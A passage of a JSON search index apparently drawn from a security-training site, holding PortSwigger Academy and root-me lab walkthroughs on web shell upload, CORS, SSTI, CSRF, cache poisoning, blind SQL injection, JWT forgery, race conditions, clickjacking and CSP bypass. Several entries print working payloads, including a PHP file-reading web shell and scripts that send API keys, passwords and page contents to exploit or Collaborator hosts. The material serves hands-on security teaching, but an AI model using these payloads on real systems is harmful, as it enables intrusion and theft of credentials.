exploit server and deliver the exploit to the victim. Poll now for interactions using Burp Collaborator client again. More HTTP interactions have been received, now containing the victim’s chat history. One of them contains the victim’s username and password. Use the exfiltrated credentials to log in to the victim user’s account. Exploitability  An attacker will need to use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim’s chat history, then use this to gain access to their account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb7082938ba4a1059dbda8435b5117b4",
    "u": "https://webapp.tymyrddin.dev/docs/upload/1",
    "t": "Remote code execution via web shell upload ",
    "c": "Remote code execution via web shell upload  Description  This lab contains a vulnerable image upload function. It doesn’t perform any validation on the files users upload before storing them on the server’s filesystem. Reproduction and proof of concept  While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page. In Burp, go to Proxy -> HTTP history . Click the filter bar to open the Filter settings dialog. Under Filter by MIME type, enable the Images checkbox, then apply your changes. In the proxy history, notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos’s secret file. For example: <?php echo file_get_contents('/home/carlos/secret'); ?> Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully. In Burp Repeater, change the path of the request to point to your PHP file: GET /files/avatars/exploit.php HTTP/1.1 Send the request. Notice that the server has executed your script and returned its output (Carlos’s secret) in the response. Enter the secret to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret ; and then enter this secret using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "140ebd752c057e8a3756dd734dcf91ef",
    "u": "https://webapp.tymyrddin.dev/docs/cors/3",
    "t": "CORS vulnerability with trusted insecure protocols ",
    "c": "CORS vulnerability with trusted insecure protocols  Description  The website of this lab has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. Reproduction and proof of concept  Start Burp, foxyproxy, and with intercept off, log in with wiener:peter to the target site and access the account page. In Burp, review the history. The API key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS. Send the request to Burp Repeater, and resubmit it with: The origin header set to an arbitrary value The origin header set to null The origin header set to begin with the origin of the site The origin header set to end with the origin of the site The CORS configuration allows the latter two, hence access from arbitrary subdomains, both HTTPS and HTTP, possibly because some subdomain is involved somewhere on the site, one that could be vulnerable. Use HTTP history to find it. Open a product page, click Check stock . It is loaded using a HTTP URL on a subdomain, and the productID parameter is vulnerable to XSS . Create exploit (replacing lab-id and exploit-server-id ): <html> <body> <script> document.location=\"http://stock.lab-id.web-security-academy.net/?productId=<script> var req = new XMLHttpRequest(); var url = 'https://lab-id.web-security-academy.net/'; req.onreadystatechange = function () { if (req.readyState == XMLHttpRequest.DONE) { fetch('https://exploit-server-id/log/key=' + req.responseText) }; }; req.open('get', url + 'accountDetails',true); req.withCredentials = true; req.send(null);</script>&storeId=1\" </script> </body> </html> As one-liner with + and < in the closing tag of the inner script url-encoded: <html> <body> <script> document.location=\"http://stock.lab-id.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = 'https://lab-id.web-security-academy.net/';req.onreadystatechange = function () {if (req.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-server-id/log/key=' %2b req.responseText)};};req.open('get', url %2b 'accountDetails',true);req.withCredentials = true;req.send(null);%3c/script>&storeId=1\" </script> </body> </html> Go to the exploit server and enter the exploit in the body field of the form. Click View exploit and check you land on the log page and your API key is in the URL. Deliver exploit to victim . Go to Access log Copy the administrator’s API key, and enter it as solution to the lab. Exploitability  If an on-path attack (MitM) between server and victim was possible, a connection to an insecure subdomain could be hijacked, and malicious JavaScript injected to exploit the CORS configuration. Unfortunately, in this lab environment on-path is not possible, so we used an alternative way of injecting JavaScript into the subdomain.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fdad4d226ee702bfe4ff127bc05961e9",
    "u": "https://webapp.tymyrddin.dev/docs/upload/2",
    "t": "Web shell upload via Content-Type restriction bypass ",
    "c": "Web shell upload via Content-Type restriction bypass  Description  This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this. Reproduction and proof of concept  Log in and upload an image as your avatar, then go back to your account page. In Burp, go to Proxy -> HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos’s secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?> Attempt to upload this script as your avatar. Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file. � Back to My Account The response indicates that you are only allowed to upload files with the MIME type image/jpeg or image/png . In Burp, go back to the proxy history and find the POST /my-account/avatar request that was used to submit the file upload. Send this to Burp Repeater. In Burp Repeater, go to the tab containing the POST /my-account/avatar request. In the part of the message body related to your file, change the specified Content-Type to image/jpeg . Send the request. The response indicates that your file was successfully uploaded. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that Carlos’s secret was returned in the response. Submit the secret to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret ; and then enter this secret using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "470a9b2d4f86363bcc96efb842009f76",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/5",
    "t": "Server-side template injection with information disclosure via user-supplied objects ",
    "c": "Server-side template injection with information disclosure via user-supplied objects  Description  This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data. Reproduction and proof of concept  Log in with content-manager:C0nt3ntM4n4g3r and edit one of the product description templates. Change one of the template expressions to something invalid, such as a fuzz string ${{<%[%'\"}}%\\ , and save the template. Internal Server Error Traceback (most recent call last): File \"<string>\", line 11, in <module> File \"/usr/local/lib/python2.7/dist-packages/django/template/base.py\", line 191,... The error message in the output hints that the Django framework is being used. Study the Django documentation and notice that the built-in template tag debug can be called to display debugging information. In the template, remove your invalid syntax and enter the following statement to invoke the debug built-in: {% debug %} Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the settings object. {'product': {'name': 'Pest Control Umbrella', 'price': '$48.16', 'stock': 80}, 'settings': } ... 'django.conf.global_settings': , ... } Study the settings object in the Django documentation and notice that it contains a SECRET_KEY property, which has dangerous security implications if known to an attacker. In the template, remove the {% debug %} statement and enter the expression {{settings.SECRET_KEY}} Results: ldbmb3c6b13x7kxiat3msfe92ycg761d Save the template to output the framework’s secret key. Click the “Submit solution” button and submit the secret key to solve the lab. Exploitability  An attacker will need to steal and submit the framework’s secret key.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5d5223bf2fd2fca712e058cdab31b5ad",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/12",
    "t": "CSRF with broken Referer validation ",
    "c": "CSRF with broken Referer validation  Description  This lab ’s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed. Reproduction and proof of concept  Open Burp’s browser and log in to your account. Submit the “Update email” form, and find the resulting request in your Proxy history. Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected. Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this: Referer: https://in-my-control.net?lab-id.web-security-academy.net Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above) and host it on the exploit server. Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows: history.pushState(\"\", \"\", \"/?0a560045032453f8c49be2be00a800b0.web-security-academy.net\") This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier. If you store the exploit and test it by clicking “View exploit”, you may encounter the “invalid Referer header” error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behaviour and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the “Head” section: Referrer-Policy: unsafe-url Note that unlike the normal Referer header, the word “referrer” must be spelled correctly in this case. Store the exploit, then click Deliver to victim . Exploitability  An attacker needs to have an account and use an exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "90f0e4e10b5a365a833dd796e41dd4f2",
    "u": "https://webapp.tymyrddin.dev/docs/cache/4",
    "t": "Targeted web cache poisoning using an unknown header ",
    "c": "Targeted web cache poisoning using an unknown header  Description  This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. Reproduction  With Burp running, load the website’s home page. In Burp, go to Proxy -> HTTP history and study the requests and responses generated. Find the GET request for the home page. With the Param Miner extension enabled, right-click on the request and select Guess headers . After a while, Param Miner will report that there is a secret input in the form of the X-Host header. Send the GET request to Burp Repeater and add a cache-buster query parameter, such as ?cb=1234 . Add the X-Host header with an arbitrary hostname, such as example.com . The value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at /resources/js/tracking.js . Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/js/tracking.js In the body, enter the payload alert(document.cookie) and store the exploit. Go back to the request in Burp Repeater and set the X-Host header with the exploit server url: X-Host: your-exploit-server-id.web-security-academy.net Send the request until you see the exploit server URL reflected in the response and X-Cache: hit in the headers. To simulate the victim, load the URL in your browser and make sure that the alert() fires. The Vary header is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their User-Agent . On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim’s browser to interact with your exploit server, for example: <img src=\"https://exploit-0a21009d04709c47c10d2f60017e00dc.exploit-server.net/foo\" /> Go to the blog page and double-check that your comment was successfully posted. Go to the exploit server and click the button to open the Access log . Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their User-Agent from the log. Go back to your malicious request in Burp Repeater and paste the victim’s User-Agent into the corresponding header. Remove the cache buster. Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved. PoC  Exploitability  An attacker will need to poison the cache with a response that executes alert(document.cookie) in the visitor’s browser; and also needs to make sure that the response is served to the specific subset of users to which the intended victim belongs.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b056d637d5cfe8772b33f409bf329c9c",
    "u": "https://webapp.tymyrddin.dev/docs/business/1",
    "t": "Excessive trust in client-side controls ",
    "c": "Excessive trust in client-side controls  Description  This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. Reproduction and proof of concept  With Burp running, log in with wiener:peter and attempt to buy the leather jacket. The order is rejected because you do not have enough store credit. In Burp, go to Proxy -> HTTP history and study the order process. Notice that when you add an item to the cart, the corresponding request contains a price parameter. Send the POST /cart request to Burp Repeater. In Burp Repeater, change the price to an arbitrary integer and send the request. Refresh the cart and confirm that the price has changed based on your input. Repeat this process to set the price to any amount less than your available store credit. Complete the order to solve the lab. Exploitability  An attacker will need to log in; study the order process; and buy a “Lightweight l33t leather jacket” for way less than intended.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e892d8ed354a376fe9f5f5ff164167a9",
    "u": "https://webapp.tymyrddin.dev/docs/dom/4",
    "t": "DOM-based open redirection ",
    "c": "DOM-based open redirection  Description  This lab contains a DOM-based open-redirection vulnerability. Reproduction and proof of concept  Analysis: < div class = \"is-linkback\" > < a href = '#' onclick = 'returnUrl = /url=(https?:\\/\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = \"/\"' > Back to Blog </ a > </ div > The url parameter allows changing the Back to Blog link in a Blog page. Construct a URL for redirecting the user to the exploit server: https://0aee00de0391e705c3631bd500ca0028.web-security-academy.net/post?postId=1&url=https://exploit-0a18009403e3e7cec36e1a18019700ff.exploit-server.net/ Paste this url in browser and hit enter. Exploitability  An attacker needs to exploit this vulnerability and redirect the victim to an exploit server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3e3febca053fdb41a6b07401d5cdc641",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/php3",
    "t": "PHP Register globals ",
    "c": "PHP Register globals  root-me challenge: PHP - Register globals : It seems that the developer often leaves backup files lying around … register_globals : In PHP < 4.1.1.1 or if misconfigured, register_globals may be active (or their behaviour is being mimicked). This implies that in global variables like $_GET if they have a value e.g. $_GET[\"param\"]=\"1234\" , you can access it via $param . Therefore, by sending HTTP parameters you can overwrite variables that are used within the code. /index.php.bak and: ?_SESSION[logged]=1",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dedcd9d3b061f0f144dc1e0f306194f3",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/16",
    "t": "Blind SQL injection with out-of-band data exfiltration ",
    "c": "Blind SQL injection with out-of-band data exfiltration  Description  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The SQL query is executed asynchronously and has no effect on the application’s response. But it is possible to trigger out-of-band interactions with an external domain. The database contains a different table called users , with columns called username and password . Reproduction and proof of concept  Visit the Home page of the shop, and use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie. Modify the TrackingId cookie, changing it to a payload that will leak the administrator’s password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows: cAR8nwK4HqzZfv5s'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.pg9488c6rmdictx7jxvteizbt2ztnjb8.oastify.com/\">+%25remote%3b]>'),'/l')+FROM+dual-- Right-click and select “Insert Collaborator payload” to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie. Go to the Collaborator tab, and click “Poll now”. If you don’t see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab. In the browser, click “My account” to open the login page. Use the password to log in as the administrator user. Exploitability  An attacker needs to exploit the blind SQL injection vulnerability to find out the password of the administrator user. To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab as intended, you must use Burp Collaborator’s default public server. To solve the lab, it is required to exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. Burp Collaborator is only available in the Enterprise and Professional editions. You can apply for a free 30-day trial here .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d9179a6d61022be2ff170cd605a6abc6",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/17",
    "t": "Exploiting HTTP request smuggling to perform web cache deception ",
    "c": "Exploiting HTTP request smuggling to perform web cache deception  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is caching static resources. Reproduction and proof of concept  Log in to the wiener:peter account and access the account page. Observe that the response doesn’t have any anti-caching headers. Smuggle a request to fetch the API key: Repeat this request a few times, then load the home page in an incognito browser window. Use the Search function on the Burp menu to see if the phrase “Your API Key” has appeared in any static resources. If it hasn’t, repeat the POST requests, force-reload the browser window, and re-run the search. Enter the victim’s API key as the lab solution. Exploitability  An attacker will need to log in as wiener:peter , to perform a request smuggling attack such that the next user’s request causes their API key to be saved in the cache. Then retrieve the victim user’s API key from the cache and submit it as the lab solution. The attacker will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key. The lab simulates the activity of a victim user. Every few POST requests an attacker makes to the lab, the victim user will make their own request. Attacks might need to be repeated a few times to ensure that the victim user’s request occurs as required. Manually fixing length fields in request smuggling attacks can be tricky. The HTTP Request Smuggler Burp extension was designed to help. It can be installed via the BApp Store.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6e5d6fc82767db874ca6655be0a6f5c3",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/6",
    "t": "JWT authentication bypass via kid header path traversal ",
    "c": "JWT authentication bypass via kid header path traversal  Description  This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem. Reproduction and proof of concept  Generate a suitable signing key In Burp, JWT Editor extension from the BApp store. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. Go to the JWT Editor Keys tab in Burp’s main tab bar. Click New Symmetric Key . In the dialog, click Generate to generate a new key in JWK format. Note that you don’t need to select a key size as this will automatically be updated later. Replace the generated value for the k property with a Base64-encoded null byte ( AA== ). Click OK to save the key. Modify and sign the JWT  Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab. In the header of the JWT, change the value of the kid parameter to a path traversal sequence pointing to the /dev/null file: ../../../../../../../dev/null In the JWT payload, change the value of the sub claim to administrator . At the bottom of the tab, click Sign , then select the symmetric key that you generated in the previous section. Make sure that the Don't modify header option is selected, then click OK . The modified token is now signed using a null byte as the secret key. Send the request and observe that you have successfully accessed the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ). Send the request to this endpoint to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; forge a JWT that gives access to the admin panel at /admin , then delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d9fecf3efb1dec7bf339721836451ce3",
    "u": "https://webapp.tymyrddin.dev/docs/headers/6",
    "t": "Host validation bypass via connection state attack ",
    "c": "Host validation bypass via connection state attack  Description  This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives. Also see Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling: Connection state attacks . Reproduction  Send the GET / request to Burp Repeater. Make the following adjustments: Change the path to /admin . Change Host header to 192.168.0.1 . Send the request. Observe that you are simply redirected to the homepage. Duplicate the tab, then add both tabs to a new group. Select the first tab and make the following adjustments: Change the path back to / . Change the Host header back to lab-id.web-security-academy.net . Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection). Change the Connection header to keep-alive . Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel. Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details: The action attribute ( /admin/delete ) The name of the input ( username ) The csrf token. On the second tab in your group, use these details to replicate the request that would be issued when submitting the form. The result should look something like this: POST /admin/delete HTTP/1.1 Host: 192.168.0.1 Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE Content-Type: x-www-form-urlencoded Content-Length: CORRECT csrf=YOUR-CSRF-TOKEN&username=carlos Send the requests in sequence down a single connection to solve the lab. PoC  Exploitability  An attacker will need to exploit the lab’s behaviour to access an internal admin panel located at 192.168.0.1/admin , then delete the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "40f76c23b1b16b08ba848ec5583b460b",
    "u": "https://webapp.tymyrddin.dev/docs/upload/7",
    "t": "Web shell upload via race condition ",
    "c": "Web shell upload via race condition  Description  This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them. Reproduction and proof of concept  Log in and upload an image as your avatar, then go back to your account page. In Burp, go to Proxy -> HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . On your system, create a file called exploit.php containing a script for fetching the contents of Carlos’s secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?> Log in and attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that aren’t images, even if you try using techniques from previous labs. If you haven’t already, add the Turbo Intruder extension to Burp from the BApp store. If you have it, load it. Right-click on the POST /my-account/avatar request that was used to submit the file upload and select Extensions -> Turbo Intruder -> Send to turbo intruder . The Turbo Intruder window opens. Copy and paste the following script template into Turbo Intruder’s Python editor: def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) request1 = ''' POST /my-account/avatar HTTP/1.1 Host: 0ac700210460078cc0ad547c00b600c7.web-security-academy.net Cookie: session=qHFu2BuxBt2u0KX9crXaq0ULzU3Ao0nP User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------20457027561279133819339941172 Content-Length: 538 Origin: https://0ac700210460078cc0ad547c00b600c7.web-security-academy.net Referer: https://0ac700210460078cc0ad547c00b600c7.web-security-academy.net/my-account Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close -----------------------------20457027561279133819339941172 Content-Disposition: form-data; name=\"avatar\"; filename=\"exploit.php\" Content-Type: application/x-php <?php echo file_get_contents('/home/carlos/secret'); ?> -----------------------------20457027561279133819339941172 Content-Disposition: form-data; name=\"user\" wiener -----------------------------20457027561279133819339941172 Content-Disposition: form-data; name=\"csrf\" p6xSMEVwv95TOguixPFQoQ0DijZwIyod -----------------------------20457027561279133819339941172-- -----------------------------215000247714924885564136028193 Content-Disposition: form-data; name=\"avatar\"; filename=\"exploit.php\" Content-Type: application/x-php <?php echo file_get_contents('/home/carlos/secret'); ?> -----------------------------215000247714924885564136028193 Content-Disposition: form-data; name=\"user\" wiener -----------------------------215000247714924885564136028193 Content-Disposition: form-data; name=\"csrf\" p6xSMEVwv95TOguixPFQoQ0DijZwIyod -----------------------------215000247714924885564136028193-- ''' request2 = ''' GET /files/avatars/exploit.php HTTP/1.1 Host: 0ac700210460078cc0ad547c00b600c7.web-security-academy.net Cookie: session=qHFu2BuxBt2u0KX9crXaq0ULzU3Ao0nP User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: image/avif,image/webp,*/* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://0ac700210460078cc0ad547c00b600c7.web-security-academy.net/my-account Sec-Fetch-Dest: image Sec-Fetch-Mode: no-cors Sec-Fetch-Site: same-origin Te: trailers Connection: close ''' # the 'gate' argument blocks the final byte of each request until openGate is invoked engine.queue(request1, gate='race1') for x in range(5): engine.queue(request2, gate='race1') # wait until every 'race1' tagged request is ready # then send the final byte of each request # (this method is non-blocking, just like queue) engine.openGate('race1') engine.complete(timeout=60) def handleResponse(req, interesting): table.add(req) In the script, replace request1 is the entire POST /my-account/avatar request containing the exploit.php file. You can copy and paste this from the top of the Turbo Intruder window. request2 is a GET request for fetching your uploaded PHP file. The simplest way to do this is to copy the GET /files/avatars/<YOUR-IMAGE> request from your proxy history, then change the filename in the path to exploit.php . And add an empty line before the closing ''' to get non-null responses for the GET . At the bottom of the Turbo Intruder window, click Attack . This script will submit a single POST request to upload your exploit.php file, instantly followed by 5 GET requests to /files/avatars/exploit.php . In the results list, notice that some GET requests received a 200 response containing Carlos’s secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted. Submit the secret to solve the lab. Exploitability  An attacker will need to log in; upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret ; and then enter this secret using the button provided in the lab banner. The vulnerable code that introduces this race condition: <?php $target_dir = \"avatars/\"; $target_file = $target_dir . $_FILES[\"avatar\"][\"name\"]; // temporary move move_uploaded_file($_FILES[\"avatar\"][\"tmp_name\"], $target_file); if (checkViruses($target_file) && checkFileType($target_file)) { echo \"The file \". htmlspecialchars( $target_file). \" has been uploaded.\"; } else { unlink($target_file); echo \"Sorry, there was an error uploading your file.\"; http_response_code(403); } function checkViruses($fileName) { // checking for viruses ... } function checkFileType($fileName) { $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION)); if($imageFileType != \"jpg\" && $imageFileType != \"png\") { echo \"Sorry, only JPG & PNG files are allowed\\n\"; return false; } else { return true; } } ?> The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it is possible to execute the file in the small time-window before it is removed. Due to the generous time window for this race condition, it is possible to solve this lab by manually sending two requests in quick succession using Burp Repeater. The solution described here teaches a practical approach for exploiting similar vulnerabilities in the wild, where the window may only be a few milliseconds.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e2735e7473218c4f47776207716f1f04",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy XML external entity (XXE) injection Labs Introduction  What?  XML external entity attacks (XXEs) are fascinating vulnerabilities that target the XML parsers of an application. Why?  XXEs can be very impactful bugs, as they can lead to confidential information disclosure, SSRFs, and DoS attacks. But they are also difficult to understand and exploit. How?  XML external entity (XXE) injection techniques Exploiting XXE using external entities to retrieve files Exploiting XXE to perform SSRF attacks Blind XXE with out-of-band interaction Blind XXE with out-of-band interaction via XML parameter entities Exploiting blind XXE to exfiltrate data using a malicious external DTD Exploiting blind XXE to retrieve data via error messages Exploiting XInclude to retrieve files Exploiting XXE via image file upload Exploiting XXE to retrieve data by repurposing a local DTD",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "011119061c1e2e1658a25e27f70d7e1c",
    "u": "https://webapp.tymyrddin.dev/docs/clickjacking/5",
    "t": "Multistep clickjacking ",
    "c": "Multistep clickjacking  Description  This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against clickjacking. Reproduction and proof of concept  Log in to the wiener:peter account on the target website. Create payload: The iframe src URL points to the target website vulnerable page. In this case, the target website’s user account page, and depends on the unique lab-id . An initial opacity of 0.1 to align the iframe actions and adjust the position values. Initial $top_value1 and $side_value1 values of resp 330px and 50px to align the “Delete account” button with the “Test me first” decoy action. Initial $top_value2 and $side_value2 variables of resp. 285px and 225px to align the “Test me next” decoy action with the “Yes” button on the confirmation page. <style> iframe { position:relative; width:500px; height: 700px; opacity: 0.5; z-index: 2; } .firstClick, .secondClick { position:absolute; top:495px; left:50px; z-index: 1; } .secondClick { top:285px; left:200px; } </style> <div class=\"firstClick\">Test me first</div> <div class=\"secondClick\">Test me next</div> <iframe src=\"https://0a0100e003ab414dc0dbe6e7003a004a.web-security-academy.net/my-account\"></iframe> Go to the exploit server and paste the payload into the body field of the form. Click Store and then View exploit . Hover over Test me first to make sure the cursor changes to a hand indicating that the div element is positioned correctly. If it is not, adjust the position of the div element by modifying the top and left properties inside the firstClick class of the style sheet. Click Test me first then hover over Test me next and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If it is not, adjust the position of the div element by modifying the top and left properties inside the secondClick class of the style sheet. Change “Test me first” to “Click me first”, “Test me next” to “Click me next”, set opacity to 0.0001 , and click Store . Deliver exploit to victim Exploitability  An attacker needs to have access to the site ( wiener:peter ) and construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on “Click me first” and “Click me next” decoy actions.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "21f926d21c10b0880baeac5973b50748",
    "u": "https://webapp.tymyrddin.dev/docs/web-client/csp-bypass-inline",
    "t": "CSP bypass inline ",
    "c": "CSP bypass inline  root-me challenge CSP Bypass - Inline code : Exfiltrate the content of the page. Content-Security-Policy: connect-src 'none'; font-src 'none'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'unsafe-inline'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content; script-src 'unsafe-inline' allows the execution of unsafe in-page scripts and event handlers. Test for simple XSS on user parameter: http://challenge01.root-me.org:58008/page?user=<img src=\"\" onerror=\"alert(1)\"> “Only the bot can see the flag”: There is a bot on the server that can read the content of the page with the flag. Go to the /report page to submit a form containing the found XSS. The server filters keywords like http , use // instead, and a space instead of + and use the concat() function: <img src=\"\" onerror=\"window.location.href='//szv6rjvql5y6v5akgsvrda0rmis9gz4o.oastify.com?c='.concat(btoa(btoa(document.getElementsByTagName('body')[0].innerText)))\"> Request received: GET 